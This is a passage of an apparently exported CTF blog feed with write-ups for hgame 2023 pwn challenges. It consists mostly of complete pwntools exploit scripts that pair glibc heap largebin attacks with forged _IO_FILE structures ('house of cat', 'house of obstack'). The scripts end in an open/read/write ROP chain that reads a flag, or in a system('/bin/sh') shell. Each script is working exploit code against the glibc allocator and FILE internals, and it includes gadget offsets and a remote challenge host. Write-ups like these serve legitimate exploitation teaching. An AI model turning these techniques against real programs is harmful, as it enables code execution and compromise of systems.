setcontext, _<span class="hljs-built_in">open</span>, read, write, mprotect, _IO_list_all<br>    <span class="hljs-keyword">global</span> _IO_stdfile_2_lock, _IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps, _IO_wfile_jumps_mmap<br><br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    <br>    binsh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    execve = libc_base + libc.sym[<span class="hljs-string">&#x27;execve&#x27;</span>]<br>    <br>    setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>    mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>    <br>    _<span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    _IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>    <br>    _IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x1f8a10</span><br>    <span class="hljs-comment"># _IO_stdfile_2_lock = libc_base + 0x1f8a20</span><br>    _IO_file_jumps = libc_base<br>    _IO_wfile_jumps = libc_base + <span class="hljs-number">0x1f30a0</span><br>    <span class="hljs-comment"># _IO_wfile_jumps = libc_base + 0x1f3240</span><br>    _IO_wfile_jumps_mmap = libc_base<br>    _IO_obstack_jumps = libc_base<br>    _IO_cookie_jumps = libc_base<br><br>    <br>    log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    log.success(<span class="hljs-string">&#x27;malloc_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>    log.success(<span class="hljs-string">&#x27;free_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>    log.success(<span class="hljs-string">&#x27;system: &#x27;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&#x27;execve: &#x27;</span> + <span class="hljs-built_in">hex</span>(execve))<br>    log.success(<span class="hljs-string">&#x27;setcontext: &#x27;</span> + <span class="hljs-built_in">hex</span>(setcontext))<br>    log.success(<span class="hljs-string">&#x27;mprotect: &#x27;</span> + <span class="hljs-built_in">hex</span>(mprotect))<br>    log.success(<span class="hljs-string">&#x27;IO_list_all: &#x27;</span> + <span class="hljs-built_in">hex</span>(_IO_list_all))<br><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br><br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x)<br>rt = <span class="hljs-keyword">lambda</span> x: p.can_recv_raw(timeout=x)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_exit</span>():<br>    menu(<span class="hljs-number">5</span>)<br><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x520</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x520</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>show(<span class="hljs-number">2</span>)<br>heap = u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span><br>lg(<span class="hljs-string">&#x27;heap&#x27;</span>, heap)<br><br>show(<span class="hljs-number">0</span>)<br>leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br>libc_base = leak - <span class="hljs-number">0x1f6cc0</span><br><br>get_gadgets(libc_base)<br><br><span class="hljs-comment"># libc-2.36-4</span><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x0000000000023b65</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x00000000000251be</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x0000000000166262</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x000000000003fa43</span><br>syscall_ret = libc_base + <span class="hljs-number">0x000000000008cc36</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><br><span class="hljs-comment"># libc-2.36-2</span><br><span class="hljs-comment"># pop_rdi_ret = libc_base + 0x0000000000023ba5</span><br><span class="hljs-comment"># pop_rsi_ret = libc_base + 0x00000000000251fe</span><br><span class="hljs-comment"># pop_rdx_rbx_ret = libc_base + 0x000000000008bbb9</span><br><span class="hljs-comment"># pop_rax_ret = libc_base + 0x000000000003f923</span><br><span class="hljs-comment"># syscall_ret = libc_base + 0x000000000008cb16</span><br><span class="hljs-comment"># ret = pop_rdi_ret + 1</span><br><br><span class="hljs-comment"># libc-2.37-1</span><br><span class="hljs-comment"># pop_rdi_ret = libc_base + 0x00000000000240e5</span><br><span class="hljs-comment"># pop_rsi_ret = libc_base + 0x000000000002573e</span><br><span class="hljs-comment"># pop_rdx_ret = libc_base + 0x0000000000026302</span><br><span class="hljs-comment"># pop_rax_ret = libc_base + 0x0000000000040123</span><br><span class="hljs-comment"># syscall_ret = libc_base + 0x000000000008b966</span><br><span class="hljs-comment"># ret = pop_rdi_ret + 1</span><br><br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x510</span>)<br><br>payload = p64(libc_base + <span class="hljs-number">0x1f7100</span>) * <span class="hljs-number">2</span> + p64(heap + <span class="hljs-number">0x290</span>) + p64(_IO_list_all - <span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">0</span>, payload)<br><br>delete(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x540</span>)<br><br>fake_IO_file_addr = heap + <span class="hljs-number">0xcf0</span><br><br><span class="hljs-comment"># house of cat</span><br>fake_IO_file = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>fake_IO_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> <span class="hljs-comment"># wide_data</span><br>fake_IO_file += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">1</span>)<span class="hljs-comment"># wide_data -&gt; _IO_write_base = rcx != 0</span><br>fake_IO_file +=p64(heap + <span class="hljs-number">0x7d0</span>)<span class="hljs-comment"># fp-&gt;_IO_backup_base = rdxwide_data -&gt; _IO_write_ptr</span><br>fake_IO_file +=p64(setcontext + <span class="hljs-number">61</span>)<span class="hljs-comment"># fp-&gt;_IO_save_end = call addr(call setcontext)</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _chain</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(_IO_stdfile_2_lock)  <span class="hljs-comment"># _lock = writable address / _IO_stdfile_2_lock</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(fake_IO_file_addr+<span class="hljs-number">0x30</span>)<span class="hljs-comment"># _wide_data</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(<span class="hljs-number">1</span>)  <span class="hljs-comment"># _mode != 0</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0xC8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(_IO_wfile_jumps + <span class="hljs-number">0x30</span>)  <span class="hljs-comment"># vtable0xd0</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(fake_IO_file_addr+<span class="hljs-number">0x40</span>)  <span class="hljs-comment"># fake_IO_wide_jumps</span><br><br>edit(<span class="hljs-number">2</span>, fake_IO_file)<br><br>flag_addr = heap + <span class="hljs-number">0x7d0</span> + <span class="hljs-number">0x200</span><br>data = heap + <span class="hljs-number">0x7d0</span> + <span class="hljs-number">0x300</span><br>rop_data = [<br>    pop_rax_ret,  <span class="hljs-comment"># sys_open(&#x27;flag&#x27;, 0)</span><br>    <span class="hljs-number">2</span>,<br>    pop_rdi_ret,<br>    flag_addr,<br>    pop_rsi_ret,<br>    <span class="hljs-number">0</span>,<br>    syscall_ret,<br><br>    pop_rax_ret,  <span class="hljs-comment"># sys_read(flag_fd, heap, 0x100)</span><br>    <span class="hljs-number">0</span>,<br>    pop_rdi_ret,<br>    <span class="hljs-number">3</span>,<br>    pop_rsi_ret,<br>    data,<br>    pop_rdx_ret,<br>    <span class="hljs-number">0x40</span>,<br>    syscall_ret,<br><br>    pop_rax_ret,  <span class="hljs-comment"># sys_write(1, heap, 0x100)</span><br>    <span class="hljs-number">1</span>,<br>    pop_rdi_ret,<br>    <span class="hljs-number">1</span>,<br>    pop_rsi_ret,<br>    data,<br>    pop_rdx_ret,<br>    <span class="hljs-number">0x40</span>,<br>    syscall_ret<br>]<br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0xa0</span>: [heap + <span class="hljs-number">0x7c0</span> + <span class="hljs-number">0x110</span>, ret],<br>        <span class="hljs-number">0x100</span>: rop_data,<br>        <span class="hljs-number">0x200</span>: <span class="hljs-string">&#x27;flag\x00\x00\x00\x00&#x27;</span><br>    &#125;, filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>,<br>)<br><br><br>edit(<span class="hljs-number">1</span>, payload)<br><br><span class="hljs-comment"># gdb.attach(p, &#x27;b _IO_flush_all_lockp&#x27;)</span><br><span class="hljs-comment"># pause()</span><br><br>_exit()<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="4nswer-s-gift"><a href="#4nswer-s-gift" class="headerlink" title="4nswer_s_gift"></a>4nswer_s_gift</h2><p>白给的libc地址，同时我们可以直接覆盖_IO_list_all，明显打IO了。但是无法泄漏堆地址，这个地方卡了好久。最后想到了mmap，malloc一块大空间，使用mmap分配，其地址与libc地址偏移一定，从而得到heap地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30404</span>)<br><br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br>malloc_hook, free_hook = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>system, execve, binsh = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>setcontext, mprotect = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_<span class="hljs-built_in">open</span>, read, write = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_list_all,  _IO_stdfile_2_lock = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_gadgets</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">global</span> malloc_hook, free_hook, binsh, system, execve, setcontext, _<span class="hljs-built_in">open</span>, read, write, mprotect, _IO_list_all<br>    <span class="hljs-keyword">global</span> _IO_stdfile_2_lock, _IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps<br><br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    <br>    binsh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    execve = libc_base + libc.sym[<span class="hljs-string">&#x27;execve&#x27;</span>]<br>    <br>    setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>    mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>    <br>    _<span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    _IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>    <br>    _IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x1f8a10</span><br>    _IO_file_jumps = libc_base + <span class="hljs-number">0x1f35e0</span><br>    _IO_wfile_jumps = libc_base + <span class="hljs-number">0x1f30a0</span><br>    _IO_obstack_jumps = libc_base + <span class="hljs-number">0x2163c0</span><br>    _IO_cookie_jumps = libc_base<br><br>    <br>    log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    log.success(<span class="hljs-string">&#x27;malloc_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>    log.success(<span class="hljs-string">&#x27;free_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>    log.success(<span class="hljs-string">&#x27;binsh: &#x27;</span> + <span class="hljs-built_in">hex</span>(binsh))<br>    log.success(<span class="hljs-string">&#x27;system: &#x27;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&#x27;execve: &#x27;</span> + <span class="hljs-built_in">hex</span>(execve))<br>    log.success(<span class="hljs-string">&#x27;setcontext: &#x27;</span> + <span class="hljs-built_in">hex</span>(setcontext))<br>    log.success(<span class="hljs-string">&#x27;mprotect: &#x27;</span> + <span class="hljs-built_in">hex</span>(mprotect))<br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br><br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x)<br>rt = <span class="hljs-keyword">lambda</span> x: p.can_recv_raw(timeout=x)<br><br><span class="hljs-comment"># gdb.attach(p, &#x27;b *0x7ffff7e44379&#x27;)</span><br><span class="hljs-comment"># pause()</span><br><br>ru(<span class="hljs-string">&#x27;it looks like this: &#x27;</span>)<br>leak = <span class="hljs-built_in">int</span>(rv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>)<br>lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br>libc_base = leak - <span class="hljs-number">0x1f7660</span><br><br>get_gadgets(libc_base)<br><br>gadgets = [<span class="hljs-number">0x4e0b0</span>, <span class="hljs-number">0xe3f59</span>, <span class="hljs-number">0xe3fb3</span>]<br>one_gadget = libc_base + gadgets[<span class="hljs-number">2</span>]<br>lg(<span class="hljs-string">&#x27;one_gadget&#x27;</span>, one_gadget)<br><br>heap_base = libc_base - <span class="hljs-number">0x204000</span><br>fake_IO_file_addr = heap_base + <span class="hljs-number">0x10</span><br><br>fake_IO_FILE = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">1</span>)<span class="hljs-comment"># wide_data</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)<span class="hljs-comment"># wide_data -&gt; _IO_write_base = rcx != 0</span><br>fake_IO_FILE +=p64(fake_IO_file_addr)<span class="hljs-comment"># fp-&gt;_IO_backup_base = rdxwide_data -&gt; _IO_write_ptr</span><br>fake_IO_FILE +=p64(system)<span class="hljs-comment"># fp-&gt;_IO_save_end = call addr(call setcontext)</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _chain</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(_IO_stdfile_2_lock)  <span class="hljs-comment"># _lock = writable address / _IO_stdfile_2_lock</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_IO_file_addr+<span class="hljs-number">0x30</span>)<span class="hljs-comment">#_wide_data, rax1_addr</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)  <span class="hljs-comment"># _mode != 0</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(_IO_wfile_jumps + <span class="hljs-number">0x30</span>)  <span class="hljs-comment"># vtable0xd0</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x110</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_IO_file_addr+<span class="hljs-number">0x40</span>)  <span class="hljs-comment"># rax2_addrfake_IO_wide_jumps</span><br><br>payload = fake_IO_FILE<br><br>ru(<span class="hljs-string">&#x27;many things do you think is appropriate to put into the gift?&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x200000</span>))<br><br>ru(<span class="hljs-string">&#x27;put into the gitf?&#x27;</span>)<br>p.send(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022-hgame-week3</title>
    <link href="/2023/02/06/2022-hgame-week3/"/>
    <url>/2023/02/06/2022-hgame-week3/</url>
    
    <content type="html"><![CDATA[<h2 id="hgame-week3-PWN"><a href="#hgame-week3-PWN" class="headerlink" title="hgame week3 PWN"></a>hgame week3 PWN</h2><h3 id="large-note"><a href="#large-note" class="headerlink" title="large note"></a>large note</h3><p><strong>largebin attack + house of obstack</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = elf.libc<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30776</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><br>malloc_hook, free_hook = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>system, execve, binsh = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>setcontext, mprotect = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_<span class="hljs-built_in">open</span>, read, write = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_list_all,  _IO_stdfile_2_lock, _IO_wide_data_1 = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, 